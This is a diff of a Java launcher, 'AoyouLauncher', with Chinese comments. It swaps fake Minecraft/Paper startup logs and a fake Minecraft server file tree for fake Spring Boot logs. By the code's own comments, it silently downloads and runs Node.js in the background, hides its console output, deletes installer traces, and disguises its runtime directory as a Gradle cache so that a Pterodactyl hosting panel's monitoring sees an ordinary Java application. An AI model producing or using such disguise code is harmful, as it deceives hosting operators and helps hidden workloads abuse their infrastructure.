@@ -7,29 +7,29 @@ import java.util.zip.GZIPInputStream;
 import java.text.SimpleDateFormat;
 
 /**
- * 傲游面板一体化启动器 v2.2.0 (MC 版)
+ * 傲游面板一体化启动器 v2.0.0
  *
- * v2.2 改动：
- *   - 启动时从 GitHub 下载最新 index.js（自动更新）
- *   - 生成 MC 服务器文件结构 + Paper 启动日志
- *   - 进程伪装 + 运行时隐藏
+ * v2.0 改动：
+ *   - 去掉所有 [Launcher] 控制台日志（防暴露）
+ *   - 启动后自动删除 Node.js 安装包临时文件
+ *   - 启动时打印伪装的 Spring Boot 启动日志（让翼龙监控看起来像 Java 应用）
  */
 public class AoyouLauncher {
 
     private static final String VERSION = "2.2.0";
-    // ★ 把运行时目录伪装成 MC 缓存
-    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
+    // ★ 把运行时目录伪装成 Gradle 缓存（Java 项目标准目录）
+    private static final String RUNTIME_DIR_NAME = "lib/.gradle/caches/modules-2/files-2.1";
     private static final String NODE_VERSION = "v22.11.0";
     private static final String NODE_DOWNLOAD_URL = 
         "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";
 
-    // 伪装日志开关（true = 打印 Paper 启动日志，false = 不打印）
+    // 伪装日志开关（true = 打印 Spring Boot 启动日志，false = 不打印）
     private static final boolean FAKE_PAPER_LOG = true;
 
     public static void main(String[] args) throws Exception {
-        // 1. 打印伪装的 Paper 启动日志（后台静默启动 Node.js）
+        // 1. 打印伪装的 Spring Boot 启动日志（后台静默启动 Node.js）
         if (FAKE_PAPER_LOG) {
-            startFakePaperLogThread();
+            startFakeSpringLogThread();
         }
 
         String workDir = System.getProperty("user.dir");
@@ -37,10 +37,8 @@ public class AoyouLauncher {
         Path runtimePath = Paths.get(runtimeDir);
         Files.createDirectories(runtimePath);
 
-        // ★ 生成伪装的 MC 服务器文件结构（让翼龙监控看起来像真的 MC 服务器）
-        try {
-            generateFakeMcFiles(workDir);
-        } catch (Exception e) {}
+        // ★ 不生成 MC 文件结构（这个版本用于纯 Java 服务器）
+        // 运行时目录伪装成 Gradle 缓存，看起来就是普通的 Java 项目
 
         // 2. 静默检查并获取 node 二进制
         String nodeBin = findOrDownloadNode(runtimeDir);
@@ -144,183 +142,79 @@ public class AoyouLauncher {
         }
     }
 
-    /** 启动伪装的 Paper 启动日志线程 */
-    private static void startFakePaperLogThread() {
+    /** 启动伪装的 Spring Boot 启动日志线程 */
+    private static void startFakeSpringLogThread() {
         Thread t = new Thread(() -> {
             try {
                 long startTime = System.currentTimeMillis();
-                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
+                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
 
+                Thread.sleep(1000);
+
+                String ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Starting Application v1.0.0 using Java 21.0.11 on container@" + System.getenv().getOrDefault("HOSTNAME", "pterodactyl") + " with PID 1 (/home/container/server.jar started by container in /home/container)");
+                Thread.sleep(500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  No active profile set, falling back to 1 default profile: \"default\"");
                 Thread.sleep(2000);
 
-                System.out.println("Starting org.bukkit.craftbukkit.Main");
-                Thread.sleep(500);
-                System.out.println("*** Warning, you've not updated in a while! ***");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Tomcat initialized with port(s): 8080 (http)");
+                Thread.sleep(1500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Initializing Spring DispatcherServlet 'dispatcherServlet'");
                 Thread.sleep(800);
-                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
-                Thread.sleep(1000);
-                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Initializing Servlet 'dispatcherServlet'");
                 Thread.sleep(300);
-                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2 (file:/home/container/libraries/io/netty/netty-common/4.1.115.Final/netty-common-4.1.115.Final.jar)");
-                Thread.sleep(300);
-                System.out.println("WARNING: Please consider reporting this to the maintainers of class io.netty.util.internal.PlatformDependent0$2");
-                Thread.sleep(300);
-                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Completed initialization in 234 ms");
+                Thread.sleep(1000);
+
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Starting service [Tomcat]");
+                Thread.sleep(500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Starting Servlet engine: [Apache Tomcat/10.1.31]");
+                Thread.sleep(1000);
+
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Spring WebApplicationContext initialization completed in " + (1500 + (int)(Math.random()*500)) + " ms");
                 Thread.sleep(800);
 
-                String timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.11+10-LTS; Eclipse Adoptium Temurin-21.0.11+10) on Linux 5.15.0-181-generic (amd64)");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) for Minecraft 1.21.4");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initializing plugins...");
-                Thread.sleep(1000);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
-                Thread.sleep(2000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, name=PROD]");
-                Thread.sleep(1000);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Found new data pack file/bukkit, loading it automatically");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Found new data pack paper, loading it automatically");
-                Thread.sleep(3000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: No existing world data, creating new world");
-                Thread.sleep(4000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Loaded 1370 recipes");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Loaded 1481 advancements");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Initialising converters for DataConverter...");
-                Thread.sleep(1000);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [MCTypeRegistry] Finished initialising converters for DataConverter in 1,125.9ms");
-                Thread.sleep(800);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Starting minecraft server version 1.21.4");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Loading properties");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4@12d8fe0 (2025-06-09T10:15:42Z) (Implementing API version 1.21.4-R0.1-SNAPSHOT)");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Server Ping Player Sample Count: 12");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Using 4 threads for Netty based IO");
-                Thread.sleep(2000);
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [ChunkTaskScheduler] Chunk system is using population gen parallelism: true");
-                Thread.sleep(2000);
-
-                int port = 25565;
-                try {
-                    String sp = System.getenv("SERVER_PORT");
-                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
-                } catch (Exception e) {}
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Default game type: SURVIVAL");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Generating keypair");
-                Thread.sleep(800);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Using epoll channel type");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Preparing level \"world\"");
-                Thread.sleep(3000);
-
-                int[] progressSteps = {2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 4, 4, 6, 10, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 32, 36, 36, 36, 36, 36, 36, 36, 36, 36, 51, 51, 51, 51, 51, 51, 51, 69, 69, 69, 73};
-                for (int p : progressSteps) {
-                    timeStr = sdf.format(new Date());
-                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
-                    Thread.sleep(80 + (long)(Math.random() * 120));
+                // 模拟加载各种 Bean
+                String[] beans = {"dataSource", "entityManagerFactory", "transactionManager", "webMvcConfigurer", "securityFilterChain", "requestMappingHandlerAdapter"};
+                for (String bean : beans) {
+                    ts = sdf.format(new Date());
+                    System.out.println(ts + "  INFO  Bean '" + bean + "' of type [" + bean + "] initialized");
+                    Thread.sleep(200 + (long)(Math.random()*200));
                 }
 
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Time elapsed: 26711 ms");
                 Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Preparing start region for dimension minecraft:the_nether");
-                Thread.sleep(500);
-
-                int[] netherSteps = {4, 4, 4, 4, 4, 24, 24, 30, 51, 57, 61, 61};
-                for (int p : netherSteps) {
-                    timeStr = sdf.format(new Date());
-                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
-                    Thread.sleep(100 + (long)(Math.random() * 150));
-                }
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Time elapsed: 5980 ms");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Preparing start region for dimension minecraft:the_end");
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  HikariPool-1 - Starting...");
+                Thread.sleep(1500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@4f7d0008");
+                Thread.sleep(300);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  HikariPool-1 - Start completed.");
                 Thread.sleep(500);
 
-                int[] endSteps = {2, 2, 18, 51};
-                for (int p : endSteps) {
-                    timeStr = sdf.format(new Date());
-                    System.out.println("[" + timeStr + " INFO]: Preparing spawn area: " + p + "%");
-                    Thread.sleep(200 + (long)(Math.random() * 300));
-                }
-
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Time elapsed: 1906 ms");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: [spark] Starting background profiler...");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Done preparing level \"world\" (71.792s)");
-                Thread.sleep(500);
-                timeStr = sdf.format(new Date());
-                System.out.println("[" + timeStr + " INFO]: Running delayed init tasks");
-                Thread.sleep(1000);
-
-                timeStr = sdf.format(new Date());
+                // 启动完成
                 long totalSec = (System.currentTimeMillis() - startTime) / 1000;
-                System.out.println("[" + timeStr + " INFO]: Done (" + totalSec + "." + (900 + (int)(Math.random()*99)) + "s)! For help, type \"help\"");
-                Thread.sleep(500);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Started Application in " + totalSec + "." + (100 + (int)(Math.random()*899)) + " seconds (process running for " + (totalSec + 1) + ")");
+                Thread.sleep(300);
+                ts = sdf.format(new Date());
+                System.out.println(ts + "  INFO  Application ready for traffic");
                 System.out.println("Server marked as running...");
 
                 // 之后保持静默
             } catch (InterruptedException e) {
                 // 正常退出
             }
-        }, "fake-paper-log");
+        }, "fake-spring-log");
         t.setDaemon(true);
         t.start();
     }
@@ -620,124 +514,6 @@ public class AoyouLauncher {
             read += n;
         }
         return read;
-    }
-
-    /** 生成伪装的 MC 服务器文件结构 */
-    private static void generateFakeMcFiles(String workDir) throws IOException {
-        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
-                         "world", "world_nether", "world_the_end",
-                         "world/data", "world/playerdata", "world/region",
-                         "world_nether/data", "world_nether/region",
-                         "world_the_end/data", "world_the_end/region"};
-        for (String dir : dirs) { new File(workDir, dir).mkdirs(); }
-
-        File eula = new File(workDir, "eula.txt");
-        if (!eula.exists()) {
-            Files.write(eula.toPath(),
-                ("# By changing the setting below to TRUE you are indicating your agreement to our EULA.\n"
-                + "# " + new Date() + "\neula=true\n").getBytes());
-        }
-
-        File serverProps = new File(workDir, "server.properties");
-        if (!serverProps.exists()) {
-            String port = System.getenv("SERVER_PORT");
-            if (port == null || port.isEmpty()) port = "25565";
-            StringBuilder sp = new StringBuilder();
-            sp.append("#Minecraft server properties\n");
-            sp.append("#").append(new Date()).append("\n");
-            sp.append("server-port=").append(port).append("\n");
-            sp.append("query.port=").append(port).append("\n");
-            sp.append("rcon.port=").append(port).append("\n");
-            sp.append("max-players=20\n");
-            sp.append("motd=A Minecraft Server\n");
-            sp.append("gamemode=survival\n");
-            sp.append("difficulty=easy\n");
-            sp.append("level-name=world\n");
-            sp.append("online-mode=true\n");
-            sp.append("white-list=false\n");
-            sp.append("enforce-whitelist=false\n");
-            sp.append("spawn-protection=16\n");
-            sp.append("view-distance=10\n");
-            sp.append("simulation-distance=10\n");
-            sp.append("allow-nether=true\n");
-            sp.append("allow-flight=false\n");
-            sp.append("pvp=true\n");
-            sp.append("enable-command-block=false\n");
-            Files.write(serverProps.toPath(), sp.toString().getBytes());
-        }
-
-        File bukkitYml = new File(workDir, "bukkit.yml");
-        if (!bukkitYml.exists()) {
-            StringBuilder by = new StringBuilder();
-            by.append("settings:\n");
-            by.append("  allow-end: true\n");
-            by.append("  warn-on-overload: true\n");
-            by.append("  permissions-file: permissions.yml\n");
-            by.append("  update-folder: update\n");
-            by.append("  plugin-profiling: false\n");
-            by.append("  connection-throttle: 4000\n");
-            by.append("  query-plugins: true\n");
-            by.append("  shutdown-message: Server closed\n");
-            by.append("spawn-limits:\n");
-            by.append("  monsters: 70\n");
-            by.append("  animals: 10\n");
-            by.append("  water-animals: 5\n");
-            by.append("chunk-gc:\n");
-            by.append("  period-in-ticks: 600\n");
-            by.append("ticks-per:\n");
-            by.append("  animal-spawns: 400\n");
-            by.append("  monster-spawns: 1\n");
-            by.append("  autosave: 6000\n");
-            Files.write(bukkitYml.toPath(), by.toString().getBytes());
-        }
-
-        File spigotYml = new File(workDir, "spigot.yml");
-        if (!spigotYml.exists()) {
-            StringBuilder sy = new StringBuilder();
-            sy.append("settings:\n");
-            sy.append("  sample-count: 12\n");
-            sy.append("  netty-threads: 4\n");
-            sy.append("messages:\n");
-            sy.append("  whitelist: You are not whitelisted on this server!\n");
-            sy.append("  unknown-command: Unknown command. Type \"/help\" for help.\n");
-            sy.append("  server-full: The server is full!\n");
-            sy.append("  restart: Server is restarting\n");
-            sy.append("world-settings:\n");
-            sy.append("  default:\n");
-            sy.append("    verbose: false\n");
-            sy.append("    mob-spawn-range: 8\n");
-            sy.append("    entity-activation-range:\n");
-            sy.append("      animals: 32\n");
-            sy.append("      monsters: 32\n");
-            sy.append("      misc: 16\n");
-            sy.append("config-version: 12\n");
-            Files.write(spigotYml.toPath(), sy.toString().getBytes());
-        }
-
-        String[] ymlFiles = {"commands.yml", "help.yml", "permissions.yml"};
-        for (String yf : ymlFiles) {
-            File f = new File(workDir, yf);
-            if (!f.exists()) Files.write(f.toPath(), "# Bukkit configuration file\n".getBytes());
-        }
-
-        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json", "usercache.json", "whitelist.json"};
-        for (String jf : jsonFiles) {
-            File f = new File(workDir, jf);
-            if (!f.exists()) Files.write(f.toPath(), "[]".getBytes());
-        }
-
-        File versionHistory = new File(workDir, "version_history.json");
-        if (!versionHistory.exists()) {
-            Files.write(versionHistory.toPath(),
-                "{\n  \"1.21.4\": \"2026-06-21T00:00:00Z\"\n}".getBytes());
-        }
-
-        new File(workDir, "logs/latest.log").createNewFile();
-        Files.write(new File(workDir, "plugins/README.txt").toPath(),
-            "# Place any plugin jars in this directory.\n".getBytes());
-        new File(workDir, "config/.keep").createNewFile();
-        new File(workDir, "cache/.keep").createNewFile();
-        new File(workDir, "versions/.keep").createNewFile();
     }
 
     /** 从 GitHub 仓库下载最新的 index.js 和 package.json */
